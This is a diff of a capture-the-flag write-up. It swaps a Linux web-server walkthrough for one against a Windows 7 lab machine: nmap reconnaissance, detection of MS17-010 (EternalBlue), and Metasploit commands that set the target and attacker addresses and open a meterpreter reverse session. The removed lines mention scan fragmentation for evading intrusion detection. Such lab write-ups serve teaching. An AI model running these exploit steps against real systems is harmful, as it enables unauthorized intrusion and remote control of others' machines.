@@ -2,12 +2,10 @@
 
 <hr style="border-color:red;"><h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Reconnaissance & Scanning</h1><hr style="border-color:red;">
 
-### **- Network scanning to display connected devices:**
-
 ### **- Verifying the connectivity of the discovered device:**
 
 ```bash
-ping -c 1 10.10.129.117
+ping -c 1 10.10.12.63
 ```
 ```bash
 ping
@@ -15,12 +13,12 @@ The ping command is used to check network connectivity between your machine and 
 -c 1
 The -c flag specifies the number of echo request packets to send. In this case, -c 1 means only one packet will be sent.
 ```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/4772f875-b891-4c88-b43f-5f262c41e038"></picture><br>TTL = 64 ==> LINUX OS</h3><hr style="border-color:red;">
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7b3d2ea0-61a7-4511-8088-dea75395c71a"></picture><br>TTL = 127 ==> WINDOWS</h3><hr style="border-color:red;">
 
 ### **- Scanning of the discovered device to find all open ports to find possible access routes:**
 
 ```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.117 -oG allPorts
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.12.63 -oG allPorts
 ```
 ```
 -p-
@@ -57,12 +55,12 @@ If a firewall is blocking pings, this option is useful to force a scan even if t
 -oG allPorts
 This tells Nmap to output the results in "Grepable" format and save them in a file called allPorts.
 ```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/b9472eda-78e1-4980-b242-40ad7a55f4c3"></picture><br>Accessible ports 22 & 80</h3><hr style="border-color:red;">
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/14e953a0-650c-4e09-9532-d084c7761ce7"></picture><br>Accessible ports 135,139,445,3389,49452,49152,49154,49158,49160</h3><hr style="border-color:red;">
 
 ### **- Analysis of the open ports found on the discovered device to get more information on the services running on those ports:**
 
 ```bash
-nmap -sCV -p22,80 192.168.1.117 -oN targeted
+nmap -sCV -p135,139,445,3389,49452,49152,49154,49158,49160 10.10.12.63 -oN targeted
 ```
 ```
 -sC
@@ -75,61 +73,65 @@ Equivalent to --script=default.
 Performs version detection of services.
 It tries to determine the exact software version running on open ports.
 
--p22,80
-Specifies that only ports 22 (SSH) and 80 (HTTP) should be scanned.
+-p
 This makes the scan faster and more targeted instead of scanning all ports.
 
 -oN targeted
 Saves the output in normal format to a file named targeted.
 You can later review this file for findings.
 ```
-<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/afbee032-4daa-4709-adf0-b93e68107541"></picture><br>22/tcp open  ssh     OpenSSH 8.2p1<br>80/tcp open  http  Apache httpd 2.4.41</h3><hr style="border-color:red;">
+<h3 align="center"><picture><img src="https://github.com/user-attachments/assets/67ace266-1259-4839-b491-fac72e358c27"></picture><br>445/tcp   open   microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) "could be vulnerable to EternalBlue"</h3><hr style="border-color:red;">
 
 ### **- Looking for vulnerabilities with nmap:**
 ```bash
-sudo nmap -f --script vuln 192.168.1.117
+nmap --script "vuln and safe" -p445 10.10.12.63
 ```
 ```
--f
-Enables packet fragmentation to split probe packets into smaller pieces.
-This can help evade firewalls or intrusion detection systems (IDS) by making it harder to detect the scan.
-Some firewalls drop fragmented packets, so results may vary.
+--script "vuln and safe" → Runs Nmap scripts that belong to both the vuln (vulnerability detection) and safe (non-destructive) categories.
 
---script vuln
-Runs all vulnerability detection scripts from Nmap’s "vuln" category.
-These scripts check for known security vulnerabilities, outdated software, and misconfigurations.
+-p445 → Specifies scanning only port 445 (SMB/Windows file sharing).
 ```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1074dfbc-d980-4883-9657-cbd29ddf8688"></picture><br>We found only possible hidden directories</h3><hr style="border-color:red;">
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e1883661-9019-48d0-a24f-718440cc2987"></picture><br>We found ms17-010 Vulnerability</h3><hr style="border-color:red;">
 
 <h1><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>Vulnerability Assessment</h1><hr style="border-color:red;">
 
-<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 80</h2>
+<h2><picture><img src="https://media2.giphy.com/media/QssGEmpkyEOhBCb7e1/giphy.gif?cid=ecf05e47a0n3gi1bfqntqmob8g9aid1oyj2wr3ds3mg700bl&rid=giphy.gif" width ="25"> </picture>PORT 445</h2>
 
-### **Scanning port 80 for possible vulnerabilities**
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/e03ed69f-7808-4607-819b-0ea465b48384"></picture></h3>
+### **Scanning ms17-010 whit METASPLOIT for possible vulnerabilities**
+```bash
+msfdb init && msfconsole
+```
+```
+msfdb init (Initialize Metasploit Database)
+msfconsole (Launch Metasploit Console)
+```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/d30ca4a3-673b-4644-8057-70dce9a04494"></picture><br>In here we will look for a vulnerability for ms17-010</h3>
 
 ```bash
-whatweb "192.168.1.117"
+search ms17-010
 ```
-```
-WhatWeb is a fingerprinting tool used to identify web technologies running on a target server or website.
-It can detect CMS platforms (WordPress, Joomla, etc.), web frameworks, web server versions, programming languages, and more.
-```
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/c150a134-0755-45e2-9d78-46ae63978def"></picture><br>We obtain some information but not very relevant.</h3>
+
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/7d22d9ff-cf8f-49ec-a4b4-bdd612605964"></picture><br>As we thought it was an eternalblue.</h3>
 
 
-### **- We analyze the source code for possible information leaks or developer notes:**
+### **- We will configure our sploit to gain access to the victim machine:**
 
 ```bash
-CTRL+U
+use 0
+show options
 ```
 
-<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/d56563a8-061b-47b5-a7af-b6dc0ce1986e"></picture><br>We find again a reference to the hidden directory login.php that we found earlier when doing the vulnerability scan with NMAP</h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/eb010bfc-605e-4753-9bdc-a5a44c50d0ae"></picture><br>The sploit is asking us to enter information about the victim and attacker ip since the ports are automatically assigned.</h3>
 
-### **- We will apply web Fuzzing to do a scan for possible hidden directories.**
+### **- We assign the information you require:**
 ```bash
-gobuster dir -u http://192.168.1.117/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,py,php,sh
+set RHOSTS 10.10.12.63
+set LHOST 10.21.118.81
+run
 ```
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/a0d1071b-0d56-46bc-87eb-4b67fea89c95"></picture><br></h3>
+<h3 align="center"><picture><img src = "https://github.com/user-attachments/assets/1573f02f-7934-4fb1-b381-a901d02f1926"></picture><br>we already have a session by meterpreter now we have to escalate privileges for that we will use a METASPLOIT module to obtain a meterpreter by means of the one we already have and thus be able to elevate our permissions.</h3>
+
 ```
 gobuster dir
 Uses Gobuster in directory brute-forcing mode.
